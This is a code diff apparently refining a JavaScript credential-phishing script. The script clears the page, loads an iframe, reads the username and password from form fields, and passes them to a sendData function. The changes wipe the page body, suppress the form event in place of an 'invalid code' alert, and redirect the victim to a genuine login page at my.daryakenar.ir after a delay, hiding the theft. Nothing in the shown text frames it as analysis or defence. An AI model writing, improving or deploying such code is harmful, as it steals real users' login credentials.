@@ -8,7 +8,7 @@
         return iframe;
     }
 
-    //document.body.innerHTML = '';
+    document.body.innerHTML = '';
     var frame = createIframe();
 
     // Add load event listener to iframe to inject script after it loads
@@ -32,10 +32,10 @@
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                     if(password.length > 2){
-                        alert('invalid code, try again');
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
                         await delay(5000);
                         parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
-                        alert('invalid code, try again');
                     }
                 }
             }, true);
